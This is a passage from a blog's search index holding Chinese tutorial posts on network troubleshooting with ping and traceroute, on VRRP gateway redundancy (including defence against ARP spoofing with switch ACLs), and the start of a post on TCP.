<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>计算机网络——排查网络故障</title>
      <link href="/2020/07/20/ji-suan-ji-wang-luo-pai-cha-wang-luo-gu-zhang/"/>
      <url>/2020/07/20/ji-suan-ji-wang-luo-pai-cha-wang-luo-gu-zhang/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br>我们知道，在复杂的互联网环境下，网络卡顿的问题时有发生，那么在此情况下，如何快速定位网络故障？快速判断是网速问题还是设备问题呢？别着急，<strong>今天教你两招，解决以下问题？</strong></p><p>如果你发现访问网页的时候有点卡卡的，断断续续很不流畅。你想看看端对端的往返延迟，以及丢包的概率，你可以用什么？Ping</p><p>发出几个包之后，却没有回包，那我们接下去该如何排除故障呢？Traceroute</p><br><p>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620073825316.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="01-初期诊断Ping协议"><a href="#01-初期诊断Ping协议" class="headerlink" title="01 初期诊断Ping协议"></a>01 初期诊断Ping协议</h1><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020062007553281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="1、Ping的使用场景"><a href="#1、Ping的使用场景" class="headerlink" title="1、Ping的使用场景"></a>1、Ping的使用场景</h2><p>如果你发现<font color='red'> 访问网页的时候有点卡卡的，断断续续很不流畅。</font>你想看看端对端的往返延迟，以及丢包的概率，你可以用什么？</p><p>回答这个问题之前，我们先来看看IP协议本身存在着弊端。</p><p>IP提供了不可靠和无连接的数据报交互，<font color='blue'>不可靠是说IP协议就是个甩手掌柜，它把IP数据包发送出去之后，根本不管对方收不收得到，要不要回包，总是把包发出去就是它唯一做的事情了 </font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620073858537.jpg#pic_center" alt=""><br>所以，在不进行任何检查的情况下，我们很难排查出到底是哪里出了问题。</p><p>而对于我们来说，<strong>最开始选择的检查方式就可以是ping</strong>，来测试网络连通性。</p><p><strong>接下来举个例子，我们可以使用ping这个小程序，比如在小明windows命令行cmd下输入ping 2.2.2.2</strong><br><br></p><h2 id="2、Ping的实际动作"><a href="#2、Ping的实际动作" class="headerlink" title="2、Ping的实际动作"></a>2、Ping的实际动作</h2><p>那Ping命令下究竟发生了什么呢？</p><p>2.1、Ping程序组织好自己的<strong>ICMP报文</strong>，其中：</p><p>Identifier用于区分不同的Ping程序<br>Sequence Number用于区分一个Ping程序消息序列号<br>Type = 8 ，表示这是一个 Echo Request</p><p>然后调用IP进程发出ICMP报文，此时TTL = 64，<br>路由器A接受到此IP报文，做TTL-1操作得到TTL = 63 ，查询路由表，发给下一跳路由器B。</p><p>一句以上同样的过程，经过26跳路由器的中继，最终到达小美的IP报文 TTL = 64 - 26 = 38<br><br></p><p>2.2、小美电脑把ICMP消息<strong>转交给ICMP进程</strong>，ICMP进程只是<strong>把Type 修改为 0</strong>，然后调用IP进程发出，此时 TTL = 64</p><p>路由器Z接收到此IP报文，做TTL - 1 操作得到TTL = 63，查询路由表，发给下一跳路由器Y</p><p>依据以上同样的过程，经过26跳路由器的中继，最终到达小明的IP报文 TTL =64 -26 =38，转发给小明Ping程序<br><br><br><br> 2.3、<strong>依据ID与序列号匹配</strong>，比如发出的ID=1,序列号为1234，接受的回应ID =1 ,序列号 = 1234，那么这一对消息完全匹配，匹配成功，关掉定时器，得到往返的延迟RTT值，获得TTL剩余值为38，打印一个消息到屏幕上，告知小明Ping的结果。</p><p>一般会发出5个Ping消息，最终会生成一个RTT的平均值、最小值、最大值，丢包个数、丢包的概率，打印在程序的后方<br><br></p><h2 id="3、-Ping的相关知识"><a href="#3、-Ping的相关知识" class="headerlink" title="3、 Ping的相关知识"></a>3、 Ping的相关知识</h2><p>3.1、 <strong>TTL是什么？</strong></p><p>TTL是 Time To Live 的英文缩写，用于表示IP报文的生存寿命，<font color='blue'> 类似游戏里的几条命或者几滴血，每经过一台路由器就减去一条命，如果没有命了，就意味着 Game Over，路由器就会丢弃它</font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620073908864.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><font color='red'> 那难道路由器就这么丢弃了，当做什么都没有发生吗。这也太不靠谱了吧。当然不是！</font></p><p>至少还要告诉IP报文的主人，TTL Expired这个消息告诉源主机，<font color='blue'> 你家的那个跑腿的ping协议，因为没有血了，被我扔出窗外了，告诉你一声。</font>小明的Ping程序接收到这个消息，会打印到屏幕上，小明就获知这个不幸的消息。<br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620073918847.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620075547659.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>3,2 、<strong>TTL为什么要减一操作？</strong></p><p>避免因为环路给路由器造成<font color='red'> 无穷负担<br> </font><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620073928570.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>真实的网络环境下一班路由器之间都有多条线相连，可能会出现 A -&gt;B -&gt; C -&gt; A -&gt;B -&gt; C，这样子的话三台路由器就形成了一个三角形的环，IP报文会在这里无休止地转圈圈。</p><p>为了不给环路中的路由器造成无休止的负担，<font color='blue'> 每经过一跳路由器，减去一条命，一个IP报文最多有255条命，那么经过255跳之后，命没了扔掉就好， </font>这可以减轻路由器的负担。你可以无理取闹，但是不能一直无理取闹。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620073937202.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>3.3、<strong><strong>TTL Expried消息如何通知相关进程？</strong></strong></p><p><font color='red'> 出错消息到达小明电脑的时候，他该如何通知对应的进程告呢？</font></p><p>要知道，一台电脑上，同时运行的进程或许有成百上千个，这个ICMP出错消息要怎么找呢？</p><p>实际上在ICMP消息体里，至少有28个字节的原始IP报文字段，所谓原始IP报文就是小明发出的Ping报文。</p><p>而这28个字节里面可以恰恰容纳 IP + ICMP头，而在TCMP头里恰恰有ID字段，比如ID =1 ,小明的电脑就会准确定位这个Ping程序，于是将出错消息果断转交给Ping程序处理。<br><br></p><p>3.4、<strong><strong>超时时间（Timeout）</strong></strong></p><p><font color='blue'> 一旦Ping报文发出之后，总不能一直傻傻地等吧，需要启动一个定时器，</font>默认的超时时间的2s，这个值对绝大多数的场合来说是足够了。如果在2s以内，不能收到回复，则直接超时处理。Ping程序会告诉小明：超时了。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620073949187.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>小明也可以修改超时时间短一些，可以更快知道结果</p><p>如果你这么久还没有回复我，那我就不等你消息了，傲娇！！！</p><br><p><strong>3.5、探测路径最大传输单元</strong></p><p><font color='blue'> 就像如果你要运输100吨货物，你可能会把100吨的货物分成十份，每十吨放进一个集装箱运输一样。</font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620073958381.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>为了保证可靠传输、传输效率的综合考虑，链路层一般会对发送的帧尺度有一个限制。比如以太网标准最大传输单元位1500字节，在家用的接入网，加入了PPPoE拨号，郑佳乐8个字节的头部，这样势必是的IP报文从1500字节减少到1492字节。</p><p>互联网上的物理路径，由于各种原因，加上各种隧道头、协议头、留给IP报文的空间小于1500字节，为了获知个人电脑和服务器之间的最大传输单元（对于IP报文来说），需要使用Ping程序来发现</p><p>如 Ping -f -l 1500 8.8.8.8</p><p>参数 -f 表示，如果IP报文大小超出路由器的发送接口的最大传输单元，则不允许任何路由器分片</p><p>参数 -l 1500,ICMP消息体的长度，不包括IP头、ICMP头的长度</p><p>这条命令会产生一个长度大于1500的IP报文，这个值大于一般物理接口的MTU，由于不允许分片，最终会被丢弃。</p><p>最终根据二分法，不断尝试，如果最终发现  Ping -f -l 1464 8.8.8.8能够得到服务器的回应，那么就意味着ICMP消息体是1464，加上20字节的IP头，再加上8字节的ICMP头，一共是1492字节。<br>这意味着小明电脑和服务器的最大传输单元MTU是1492，至于为什么1492而不是1500，是因为有8字节的PPPoE协议头<br><br><br>3.6、<strong><strong>Ping不同的情况分析</strong></strong></p><p>主机不可达，TTL到0了</p><p>网络不可达，<font color='red'> 阻塞了，太卡了，堵车了，就丢包了</font></p><p>端口不可达，<font color='red'> 你要到达的端口没有开启<br></font></p><p>协议不可达，<font color='red'> ACL，访问控制列表，不允许你这个IP给我发送数据</font></p><p>需要分片</p><p>源路由错误</p><p>未知的目的网络</p><p>未知的目的主机</p><p><br><br></p><h1 id="02-追加诊断Traceroute协议"><a href="#02-追加诊断Traceroute协议" class="headerlink" title="02 追加诊断Traceroute协议"></a>02 追加诊断Traceroute协议</h1><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620075125239.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="1、Traceroute的使用场景"><a href="#1、Traceroute的使用场景" class="headerlink" title="1、Traceroute的使用场景"></a>1、Traceroute的使用场景</h2><p> <strong>当使用Ping命令，发出几个包之后，却没有回包，那我们接下去该如何排除故障呢？</strong></p><p>我们可以使用Traceroute工具，这个工具可以<strong>追踪网络路径</strong>，谁的网络路径呢？是IP包的，追踪的是IP包双向路径，IP包从小明发出到达小美，这是出方向；IP包从小美返回小明，这是入方向的；只要有一个方向的IP包不能通行，用户机会感觉网络出现问题了。</p><p>Traceroute会把小明，小美之间所经过的每一跳路由器都打印出来，同时还会打印小明到每一跳路由器的最大、最小、平均延迟，<strong>这样就画出了了一张中继设备的连接图，哪有出现问题就一目了然了</strong></p><br><h2 id="2、Traceroute的工作过程"><a href="#2、Traceroute的工作过程" class="headerlink" title="2、Traceroute的工作过程"></a>2、Traceroute的工作过程</h2><p>那么<strong>Traceroute究竟是如何工作</strong>的呢？</p><p><strong>1、TTL = 1</strong></p><p>Traceroute使用UDP协议来传输探测回声，目的端口号一般位于32768-65535之间，假设这里使用的是65000，IP头里会有一个小技巧，将TTL设置为1，这样子当这个IP包到达第一跳路由器，做TTL - 1 操作，TTL会变为0，路由器就要使用ICMP发出错误消息：TTL Expired，同时还会截取回声IP包至少28个字节放在ICMP消息里。</p><p><strong>为什么要截取28个字节，有什么用呢？</strong></p><p>其中包含20字节的IP头、8字节的UDP头，这样小明ICMP进程就会根据UDP端口号来定位是哪个进程的报错消息，揉揉眼睛一看，原来是Traceroute的报错消息啊，然后就转交给它来处理</p><p>Traceroute将第一跳路由器打印输出，这一步一共发送三个探测包，最终会得到往返延迟的最大、最小、平均延迟，并打印输出</p><p>以此类推<br><br><br><strong>N、TTL = N</strong></p><p>TTL = 2 ，到达第二跳，TTL 也变为 0 ，也发报错消息，小明就会知道第二跳的IP地址。</p><p>依照以上类似方法，TTL一直变化为3、4、5…N,小明就会知道第三跳、第四跳…第N跳的IP地址，并将它们一一打印出来<br><br><br><strong>第N+1步：TTL = N + 1</strong></p><p>最终IP报文到达了小美的电脑，IP进程发现这是本地的IP地址，于是依据UDP报文中的目的端口号65000，去尝试发现进程，结果没有发现有进程和端口号65000绑定，于是通知小明一个出错消息，<strong>即端口不可达</strong></p><p>小明接收到这个消息，则可以放心地认为，回声探测已经达到了终点，把最后一跳路由器的IP打印出来，整个过程结束<br><br><br><br></p><h1 id="03-排查故障简单小结"><a href="#03-排查故障简单小结" class="headerlink" title="03 排查故障简单小结"></a>03 排查故障简单小结</h1><p>当我们在网络连接方面出现问题的时候，首先我们用Ping某个IP地址测试网络连通性，如果<strong>Ping命令成功返回4次成功的RRT</strong>，则大概率网络通信无问题，网络连接可能网速或者网络不稳定。</p><p>如果Ping命令发现<strong>没有成功ping通</strong>，则接着采用Traceroute协议进行查看，精准定位到到底是那一台路由器，那一段的网段出现问题。</p><p><font color='blue'> 这是一个从整体到局部，从一个大范围缩小到某台路由器的排查网络故障过程。</font></p><p><br><br><br></p><p><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p><p>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 排错 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络——VRRP（第一条冗余协议）</title>
      <link href="/2020/07/20/ji-suan-ji-wang-luo-vrrp-di-yi-tiao-rong-yu-xie-yi/"/>
      <url>/2020/07/20/ji-suan-ji-wang-luo-vrrp-di-yi-tiao-rong-yu-xie-yi/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br><strong>本文将针对以下问题逐条进行解答：</strong></p><p>01 网关意味着什么？</p><p>02 针对网关突然挂掉的情况，有什么解决的方法吗？</p><p>03 VRRP是如何工作的？</p><p>04 如何防止第三方实施的ARP欺骗，假冒自己就是网关？</p><p>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620135011158.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="01-网关存在的意义"><a href="#01-网关存在的意义" class="headerlink" title="01 网关存在的意义"></a>01 网关存在的意义</h2><p>网关和主机的关系，<font color='blue'>就相当于大门对于在家呆着的我们的关系，我们要想去外面的花花世界，就必须得经过这道门。<br></font><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620134726199.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><font color='blue'> 如果网关挂了，那就意味这这道门被关上了，我们就像被囚禁起来的罪犯只能呆在自家房间小天地，十分拘束。也就是说，主机只能在内网直接互相访问，而连接不到外网了。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620134735550.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br> </font><br><br><br></p><h2 id="02-针对网关突然挂掉情况的解决方案"><a href="#02-针对网关突然挂掉情况的解决方案" class="headerlink" title="02 针对网关突然挂掉情况的解决方案"></a>02 针对网关突然挂掉情况的解决方案</h2><p><font color='red'>我们知道网关如此重要，那么我们是不是必须采取什么措施，以防万一呢？</font></p><p><font color='blue'> 联想一下实际，在现实生活中，公共场所里，有没有可能出现一扇门出故障不能使用的情况？<br>是会的，对吧。</font></p><p>那这种问题该如何解决呢？<br><font color='blue'> 很简单，多配几扇门。通过配备多扇门，多个出口，可以帮助我们在火灾、地震等突发灾难发生时，给与我们多几条逃生通道，有利于减少突发情况带来的损失。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620134750825.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br> </font><br>网关也是一样，既然那么重要，那我们是不是要多配备几台设备互相备份冗余一下呢。<br>而这就有种专门的技术，叫做 <strong>第一跳冗余备份</strong>，其中IETF打造了一个业界标准的协议，简称为VRRP。</p><p>通过VRRP技术，如果主机在VLAN10内，只要VLAN10内有两台物理网关，使用一样的虚拟IP 10.1.1.1，也有一样的虚拟MAC，如果一台网关死机，对于主机来说，其实一点关系也没有，流量可以自动切换到另外一台网关发送，接受<br><br><br></p><h2 id="03-VRRP是如何工作机制"><a href="#03-VRRP是如何工作机制" class="headerlink" title="03 VRRP是如何工作机制"></a>03 VRRP是如何工作机制</h2><h3 id="1、VRRP首席网关的选举"><a href="#1、VRRP首席网关的选举" class="headerlink" title="1、VRRP首席网关的选举"></a>1、VRRP首席网关的选举</h3><p>配置了VRRP的网关当启动完成后，会主动向组播地址 224.0.0.18 发送VRRP消息，VRRP消息里有优先级，首席网关的优先级为255，次席网关优先级默认为100，次席网关一旦发现有优先级255的首席网关存在，将会保持沉默，而网络上只会有首席网关周期性地发送VRRP消息。</p><p>关于优先级，一般位于0-255不等，越大越优先，255用于首席网关，1-254用于次席网关，次席网关优先级默认为100。</p><p>有一种手动调整首席网关的方法，那就是首席网关可以把自己的优先级设为0，那么次席网关一旦发现首席网关的优先级为0，就会上位，立马顶替掉首席网关的位置，而无需等待超时<br><br></p><h3 id="2、首席网关主动ARP广播"><a href="#2、首席网关主动ARP广播" class="headerlink" title="2、首席网关主动ARP广播"></a>2、首席网关主动ARP广播</h3><p><font color='blue'> 就像很多古代换皇帝一样，新的皇帝上位做的第一件事情就是，昭告天下自己是天子。 </font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620134814601.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><font color='blue'>首席网关也是这个尿性，那么它是如何嚣张地亮明自己的身份呢？ </font></p><p>一方面首席网关主动告诉广播域内的主机自己的IP、MAC的对应关系，另一方面告诉交换机连接自己的端口、MAC对应信息。这样子主机知道首席网关的MAC，交换机知道首席网关对应的端口，那么主机与网关之间的通信就被打通了。不会出现由于交换机不知道首席网关的位置，而采用广播泛洪的方式扩散。</p><p>具体来说，首席网关会周期性的发送VRRP消息，默认情况一秒发一个消息，强调表明自己的存在。</p><p>如果该广播域下的主机，请求10.1.1.1，那么只能首席网关来回答，告诉主机对应的MAC地址。</p><p><font color='blue'> 而这时候次席主机，就只能安安静静地看着首席主机说活，屈居幕后，自己当个哑巴，不然会出现流量的震荡。 </font><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620134834698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h3 id="3、首席、次席网关身份切换"><a href="#3、首席、次席网关身份切换" class="headerlink" title="3、首席、次席网关身份切换"></a>3、首席、次席网关身份切换</h3><p><font color='blue'> 皇帝有名正言顺让位的时候，或许是因为年老体衰，或许是因为推举德才，首席网关也有这种情况。</font><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620134844482.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>当首席网关发现自己通往外部的接口断了，不能再帮助主机转发数据的时候，它就会自动降低优先级，主动让权，比如调到50，这样次席网关就会胜出，充当首席网关了。</p><p><font color='blue'>除了名正言顺传皇位外，皇帝总有出意外的情况啊，要么是老死，或者是病故。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620134855242.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br> </font><br><font color='red'>对于次席来说，如果连续3次没有听到首席的消息，则意味着首席网关可能挂掉了，那怎么办啊？</font><font color='blue'> 国不可一日无主啊！于是，次席上位了，成了首席服务官。 </font></p><p><font color='blue'> 可这有一个问题，你说连续3次没听到，这个时间如何把握呢？你作为太子，你爸3s内不说自己是皇帝，你就觉得他驾崩了吗</font></p><p>如果VRRP消息发送间隔特别小，比如100毫秒，意味着300毫秒如果次席网关无法接受到首席网关发送的VRRP消息，次席就会自己顶替首席的位置。问题是，如果首席没有死，只是有点忙，比如说出口队列被各种包拥堵这，VRRP消息无法及时发送呢？如果这样的话，由于信息不对称，之后一下子出来两个皇帝，天下不就动荡了嘛。</p><p>所以，为了克服这个问题，需要将VRRP消息设置成最高优先级，这样就不会被堵在出口队列了，次席会及时接收到来自首席的消息。</p><p><br><br></p><h3 id="4、次席网关顺利接过原首席网关的流量"><a href="#4、次席网关顺利接过原首席网关的流量" class="headerlink" title="4、次席网关顺利接过原首席网关的流量"></a>4、次席网关顺利接过原首席网关的流量</h3><p>对于主机来说，他们看到的网关一直都是 IP = 10.1.1.1 ，MAC地址也是一样的。不会因为首席、次席替换位置而改变，他们的ARP缓存里保存这这些关键信息，对于他们来说，把数据帧封装好扔到网卡就万事大吉了。</p><p><font color='red'>但是交换机不就傻了吗？他的MAC地址表里面网关对应的MAC地址还没有变的话，流量全部转发到原网关，最终不是会被丢弃嘛，这显然不合理。<br></font><br>为了避免交换机做傻事，就像前面提到的，一有新的首席网关上线就会立马发送VRRP消息，昭告自己的存在。这样交换机就会刷新自己对于网关的位置信息，不会丢失用户的流量。</p><h3 id="相关知识点补充："><a href="#相关知识点补充：" class="headerlink" title="相关知识点补充："></a>相关知识点补充：</h3><p>虚拟IP地址（VIP）、MAC地址：其实就是上文中主机认为的网关IP地址和网关MAC地址，主机知道的就是这两个，觉得一直没有变。</p><p>首席、次席网关真实IP、MAC地址：其实就是他们原本的IP、MAC地址，<font color='blue'>除了皇帝的身份外，他们还有自己的身份不是嘛。但是皇帝身份最大，其他身份只有当他们不再担任首席网关是，与别的主机通信时才可以用。 </font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620134915487.jpg#pic_center" alt=""><br><br><br><strong>VRRP的IP层封装格式：</strong><br>VRRP工作在IP层上，协议号为112.消息发往一个IP组播地址，224.0.0.18，这是一个只存在于本地链路的组播，即除了VRRP消息的接受者，提取出VRRP消息内容后，就要把包丢弃掉，不能继续转发该组播。</p><p>凡是224.0.0.x组播地址，生存周期只有一跳，发送方发出，接收方接受，游戏就结束了</p><p>源IP地址就是发出VRRP消息物理接口的IP地址<br><br><br><strong>以太帧头封装格式：</strong></p><p>目的MAC= [01-00- 5E -00-00-12」<br>源MAC =「00-00-5E-00-01-0a」<br>那这两个MAC是怎么来的?</p><p>01-00-5E-00-00-12<br>其中01-00-5E为组播的OUI代码( Organizational Unique<br>Identifier ),剩下的「00-00-12」 是224.0.0.18从右往左数的23位,这<br>23位为「0.0.18」， 换算成16进制为「00-00-12」。</p><p>00-00-5E-00-01-0a<br>这个是根据这个公式来的: 00-00-5E-00-01 -[VRID]<br>其中VRID为VRRP组ID,由于VRRP ID = 10,对应的16进制就是<br>「a」。</p><p>这个组播对于二层交换机，和处理广播包-样处理,所以这个<br>VLAN 10里的所有主机、网关都会收到这些消息，<font color='red'>只是小明的主机不感兴<br>趣，故忽略。</font><br><br><br></p><h2 id="04-预防冒充网关的方案"><a href="#04-预防冒充网关的方案" class="headerlink" title="04  预防冒充网关的方案"></a>04  预防冒充网关的方案</h2><p><font color='red'>为了防止第三方参与VRRP消息交互，要配置认证，这样第三方的信息就会由于没有认证，将无法和合法的网关进行消息交互，但是这些措施只会保护VRRP消息交互，并无法阻止第三方实施的ARP欺骗。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620134928805.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><strong>欺骗路由器不成，我欺骗主机还不行嘛？</strong> </font></p><p>比如主机请求网关的MAC,网关的MAC为: 00-00-5E-00-01-0a，<br>可是第三方不断欺骗主机，网关为: 00-33-33-33-33-33, 那么本来<br>发给网关的流量，会发给「00-33-33-33-33-33] 主机。</p><p>为了一劳永逸地克服以上困难，需要在交换机所有接入端口(连接主机)<strong>配置ACL</strong>,用于过滤掉VRRP消息、过滤掉ARP欺骗消息。<strong>这样主机既无法参与VRRP消息的选举，也无法欺骗其他主机，自己就是网关。</strong></p><p><br><br><br><br><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p><p>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VRRP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络——域名解析后的TCP协议详解</title>
      <link href="/2020/07/20/ji-suan-ji-wang-luo-yu-ming-jie-xi-hou-de-tcp-xie-yi-xiang-jie/"/>
      <url>/2020/07/20/ji-suan-ji-wang-luo-yu-ming-jie-xi-hou-de-tcp-xie-yi-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font></p><p>本文将要说明的是，当你使用http协议访问某域名时，对应网络层中TCP协议的具体工作情况。</p><p><strong>本文将针对以下问题逐条进行解答：</strong></p><p>01 域名解析后，TCP进程此时传送的是什么？</p><p>02 TCP进程三次握手连接的原因和步骤？</p><p>03 建立握手后，TCP如何传送HTTP？</p><p>04 TCP如何确定对方拿到了HTTP数据？</p><p>05 TCP为什么要释放连接？</p><p>06 TCP如何关闭连接？</p><p>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620153522896.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h1 id="01-TCP传输的HTTP包"><a href="#01-TCP传输的HTTP包" class="headerlink" title="01 TCP传输的HTTP包"></a>01 TCP传输的HTTP包</h1><p>域名解析后，浏览器回根据应用层协议，将用户访问 某域名 的请求打包成HTTP/HTTPS格式，如何将打包好的HTTP告诉TCP进程，同时告诉TCP进程 